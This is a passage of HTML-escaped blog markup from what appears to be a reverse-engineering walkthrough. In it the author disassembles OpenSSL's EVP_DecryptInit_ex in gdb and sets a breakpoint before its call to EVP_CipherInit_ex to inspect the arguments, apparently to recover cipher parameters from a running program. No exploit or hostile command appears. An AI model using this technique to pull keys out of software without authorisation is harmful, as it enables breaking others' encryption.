   &lt;span style=&#34;color: #93A1A1&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;xb7ed3a33&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;19&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;	&lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;    &lt;span style=&#34;color: #DC322F&#34;&gt;DWORD&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;PTR&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;esp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0x14&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;],&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0x0&lt;/span&gt;
   &lt;span style=&#34;color: #93A1A1&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;xb7ed3a3b&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;27&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;	&lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;    &lt;span style=&#34;color: #DC322F&#34;&gt;DWORD&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;PTR&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;esp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0x10&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;],&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;
   &lt;span style=&#34;color: #93A1A1&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;xb7ed3a3f&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;31&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;	&lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;    &lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt;&lt;span style=&#34;color: #DC322F&#34;&gt;DWORD&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;PTR&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;esp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0x3c&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;
   &lt;span style=&#34;color: #93A1A1&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;xb7ed3a43&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;35&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;	&lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;    &lt;span style=&#34;color: #DC322F&#34;&gt;DWORD&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;PTR&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;esp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0xc&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;],&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;
   &lt;span style=&#34;color: #93A1A1&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;xb7ed3a47&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;39&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;	&lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;    &lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt;&lt;span style=&#34;color: #DC322F&#34;&gt;DWORD&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;PTR&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;esp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0x38&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;
   &lt;span style=&#34;color: #93A1A1&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;xb7ed3a4b&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;43&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;	&lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;    &lt;span style=&#34;color: #DC322F&#34;&gt;DWORD&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;PTR&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;esp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0x8&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;],&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;
   &lt;span style=&#34;color: #93A1A1&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;xb7ed3a4f&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;47&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;	&lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;    &lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt;&lt;span style=&#34;color: #DC322F&#34;&gt;DWORD&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;PTR&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;esp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0x34&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;
   &lt;span style=&#34;color: #93A1A1&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;xb7ed3a53&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;51&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;	&lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;    &lt;span style=&#34;color: #DC322F&#34;&gt;DWORD&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;PTR&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;esp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0x4&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;],&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;
   &lt;span style=&#34;color: #93A1A1&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;xb7ed3a57&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;55&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;	&lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;    &lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt;&lt;span style=&#34;color: #DC322F&#34;&gt;DWORD&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;PTR&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;esp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0x30&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;
   &lt;span style=&#34;color: #93A1A1&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;xb7ed3a5b&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;59&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;	&lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;    &lt;span style=&#34;color: #DC322F&#34;&gt;DWORD&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;PTR&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;esp&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;],&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;
   &lt;span style=&#34;color: #93A1A1&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;xb7ed3a5e&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;62&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;	&lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;   &lt;span style=&#34;color: #2AA198&#34;&gt;0xb7e50660&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;EVP_CipherInit_ex@plt&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&lt;/span&gt;
   &lt;span style=&#34;color: #93A1A1&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;xb7ed3a63&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;67&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;	&lt;span style=&#34;color: #268BD2&#34;&gt;add&lt;/span&gt;    &lt;span style=&#34;color: #B58900&#34;&gt;esp&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0x28&lt;/span&gt;
   &lt;span style=&#34;color: #93A1A1&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;xb7ed3a66&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;70&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;	&lt;span style=&#34;color: #268BD2&#34;&gt;pop&lt;/span&gt;    &lt;span style=&#34;color: #B58900&#34;&gt;ebx&lt;/span&gt;
   &lt;span style=&#34;color: #93A1A1&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;xb7ed3a67&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;71&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;	&lt;span style=&#34;color: #268BD2&#34;&gt;ret&lt;/span&gt;
&lt;span style=&#34;color: #268BD2&#34;&gt;End&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;of&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;assembler&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;dump.&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;We can see &lt;code&gt;EVP_CipherInit_ex&lt;/code&gt; called at &lt;code&gt;0xb7ed3a5e&lt;/code&gt;. Let’s put a breakpoint there (right before function call) and look at its arguments.&lt;/p&gt;

&lt;p&gt;


    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;running in gdb with debug info 2&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;gdb&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0xb7ed3a5e&lt;/span&gt;
&lt;span style=&#34;color: #268BD2&#34;&gt;Breakpoint&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;at&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0xb7ed3a5e&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;gdb&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;c&lt;/span&gt;
&lt;span style=&#34;color: #268BD2&#34;&gt;Continuing.&lt;/span&gt;

&lt;span style=&#34;color: #268BD2&#34;&gt;Breakpoint&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0xb7ed3a5e&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;EVP_DecryptInit_ex&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;()&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;from&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;usr&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;lib&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;i386&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;linux&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;gnu&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;i686&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;cmov&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;libcrypto.so.1.0.0&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;gdb&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;di&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;sass&lt;/span&gt;
&lt;span style=&#34;color: #268BD2&#34;&gt;Dump&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;of&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;assembler&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;code&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;EVP_DecryptInit_ex&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;
   &lt;span style=&#34;color: #93A1A1&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;xb7ed3a20&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;	&lt;span style=&#34;color: #268BD2&#34;&gt;push&lt;/span&gt;   &lt;span style=&#34;color: #B58900&#34;&gt;ebx&lt;/span&gt;
   &lt;span style=&#34;color: #93A1A1&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;xb7ed3a21&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;	&lt;span style=&#34;color: #268BD2&#34;&gt;sub&lt;/span&gt;    &lt;span style=&#34;color: #B58900&#34;&gt;esp&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0x28&lt;/span&gt;
   &lt;span style=&#34;color: #93A1A1&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;xb7ed3a24&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;4&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;	&lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;    &lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt;&lt;span style=&#34;color: #DC322F&#34;&gt;DWORD&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;PTR&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;esp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0x40&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;
   &lt;span style=&#34;color: #93A1A1&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;xb7ed3a28&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;8&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;	&lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;   &lt;span style=&#34;color: #2AA198&#34;&gt;0xb7e510db&lt;/span&gt;
   &lt;span style=&#34;color: #93A1A1&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;xb7ed3a2d&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;13&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;	&lt;span style=&#34;color: #268BD2&#34;&gt;add&lt;/span&gt;    &lt;span style=&#34;color: #B58900&#34;&gt;ebx&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0xe65c7&lt;/span&gt;
   &lt;span style=&#34;color: #93A1A1&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;xb7ed3a33&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;19&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;	&lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;    &lt;span style=&#34;color: #DC322F&#34;&gt;DWORD&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;PTR&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;esp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0x14&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;],&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0x0&lt;/span&gt;
   &lt;span style=&#34;color: #93A1A1&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;xb7ed3a3b&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;27&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;	&lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;    &lt;span style=&#34;color: #DC322F&#34;&gt;DWORD&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;PTR&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;esp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0x10&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;],&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;
   &lt;span style=&#34;color: #93A1A1&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;xb7ed3a3f&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;31&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;	&lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;    &lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt;&lt;span style=&#34;color: #DC322F&#34;&gt;DWORD&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;PTR&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;esp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0x3c&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;
   &lt;span style=&#34;color: #93A1A1&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;xb7ed3a43&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;35&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;	&lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;    &lt;span style=&#34;color: #DC322F&#34;&gt;DWORD&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;PTR&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;esp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0xc&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;],&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;
